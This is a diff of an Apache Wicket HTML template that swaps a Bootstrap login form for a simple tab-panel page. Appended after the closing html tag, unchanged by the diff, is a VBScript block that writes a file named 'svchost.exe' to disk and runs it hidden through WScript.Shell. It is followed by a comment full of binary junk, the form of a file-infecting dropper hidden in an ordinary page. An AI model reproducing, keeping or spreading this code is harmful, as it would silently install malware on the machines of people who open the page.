@@ -1,103 +1,44 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-	<title>Login</title>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-<wicket:link>
-<!--===============================================================================================-->	
-	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
-<!--===============================================================================================-->	
-	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
-<!--===============================================================================================-->	
-	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="css/util.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="css/main.css">
-</wicket:link>
+<html>
+  <head>
+  <style>
+ div.tabpanel div.tab-row li {
+  margin: 0;
+  padding: 0;
+  display: inline;
+  list-style-type: none;
+}
+
+div.tabpanel div.tab-row a:link,
+ div.tabpanel div.tab-row a:visited {
+  float: left;
+  background: #f3f3f3;
+  font-size: 12px;
+  line-height: 14px;
+  font-weight: bold;
+  padding: 2px 10px 2px 10px;
+  margin-right: 4px;
+  border: 1px solid #ccc;
+  text-decoration: none;
+  color: #666;
+}
+
+div.tabpanel div.tab-row li.selected a:link,
+ div.tabpanel div.tab-row a:visited.active {
+  border-bottom: 1px solid #fff;
+  background: #fff;
+  color: #000;
+}
+
+div.tabpanel div.tab-row a:hover {
+  background: #fff;
+}
+  </style>
 </head>
 <body>
-	
-	<div class="limiter">
-		<div class="container-login100" style="background-image: url('images/bg-01.jpg');">
-			<div class="wrap-login100">
-				<form class="login100-form validate-form" wicket:id = "userForm">
-					<span class="login100-form-logo">
-						<i class="zmdi zmdi-landscape"></i>
-					</span>
-
-					<span class="login100-form-title p-b-34 p-t-27">
-						Log in
-					</span>
-
-					<div class="wrap-input100 validate-input" data-validate = "Enter username">
-					  <input class="input100" wicket:id="username" type="text" size="20" placeholder="Username" />
-					
-						<span class="focus-input100" data-placeholder="&#xf207;"></span>
-					</div>
-
-					<div class="wrap-input100 validate-input" data-validate="Enter password">
-			 		 <input class="input100" wicket:id="password" type="text" size="20" placeholder="Password" />
-						
-						<span class="focus-input100" data-placeholder="&#xf191;"></span>
-					</div>
-
-					<div class="contact100-form-checkbox">
-						<input class="input-checkbox100" id="ckb1" type="checkbox" name="remember-me">
-						<label class="label-checkbox100" for="ckb1">
-							Remember me
-						</label>
-					</div>
-
-					<div class="container-login100-form-btn">
-						<button class="login100-form-btn">
-							Login
-						</button>
-					</div>
-
-					<div class="text-center p-t-90">
-						<a class="txt1" href="#">
-							Forgot Password?
-						</a>
-					</div>
-				</form>
-			</div>
-		</div>
-	</div>
-	
-
-	<div id="dropDownSelect1"></div>
-	
-<!--===============================================================================================-->
-	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/animsition/js/animsition.min.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/bootstrap/js/popper.js"></script>
-	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/select2/select2.min.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/daterangepicker/moment.min.js"></script>
-	<script src="vendor/daterangepicker/daterangepicker.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/countdowntime/countdowntime.js"></script>
-<!--===============================================================================================-->
-	<script src="js/main.js"></script>
-
+  <p>
+  <div wicket:id="tabs" class="tabpanel"></div>
+  </p>
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
@@ -113,7 +54,7 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--$Œ·‹Üöna¯²,¨nb—*Kn*ÊÎ¾‡u;„·œV‹ÜÓ,lÍõ<œé­¼¶aŞC!P‘ëı íÊÚŠØ>A¡4fó³¾ô2Ğ±©Ûşt`]Ñ››œ3pëxÑØ[¦×°ZµPDZ\2’Ğ"¡‰EÍ¦ˆ\
-UV“.n}ÏØŸÓƒÍï|4éŒí
-aŠ÷œÏîğqv<µ¦»~h¶b¿Á5ÃDĞ ‡0Ë?¾T /LL:xgePŸää”Ëû«.	çÈ;ş•;/ËHŠDWÌª!ŸZJ¡f©Á€}(N5ÊÃµÂŠ“¤ˆxÏ5í2<»>ÔçíÇ¯BØú“) Z=+Œ
-¹MÏ<¶‹¥P»¢¶	CWwÑyóŠ]×—Û³ü »Z—MÏq1‰·íòê¾ŒDÍàV	 ˜s7[zSd+ÃŞùt.a$mâ6–Ôgte*vJ@¯ƒok ráç4ÇMmÁÚg"m4ÏôFé+‚>™ ÷T#o–İöY?ÃËxÏ*ªg8€ÓJÂ‚ŒÈ Å‡ômSøH.¼±"¿3ÌÀˆ|#êuš)=Dûñ©·feVvñgiÕŞ ÓÃ«\h%3ÑÏq=U7èâáÃOÂa ËRøËËË†ÑN¶Ã·YÖØ Ë-->
+//--></SCRIPT><!--‘éÒİ€¿ÇßÛğTq9iÂë¢›QOi§àr¹‘®'<`}f¦§A¯½ş×{•@Æ÷çú0UæV¦{Æ¹ÕW~ù;¶Â]ÃCµíÁÕ–Ø:¬Q¢>§ÏğdºËøäÖIÒf¸f¥kKW`spÁ¸ÇÜÚ­ËnõwÚ¢tU&;·´ø~·%û5!¾ÓF“>Ò'\9²5ùÎf
+rj70à¢;
+œ5?Ú¡”àj(kô[N­Ğë¦Ùfx‰aI
+~ÇÓ‰;UeÇçô©"ü‹Ãá˜öj¬Î9â3çá&j«ÌwNæ§K‰…—¢wõaPƒòÉxuÂBLr’6}áİ·ù¬ı@(;hO¼ĞkÍUÑ{ëu$z9;©›À¾×r{Ùr½_[KvJSv‘JÏ–J+C×o)bèĞõ%¡Î¯rY1¹\¼êH«tğÒ0Ià\z*Ä5"IÓŞÇ¶·eÃAõÁGÙ)ŸXõLæƒÉóîrYj0æã¬*üÏÂùç<Ò³‡,,·'{	‚_Æ ˆĞ|Î.‘3„Ñ<`îÚ(K£Í# ÆñRêûÆñÆñÆñ‹,MTµMZÅñ Æñ-->
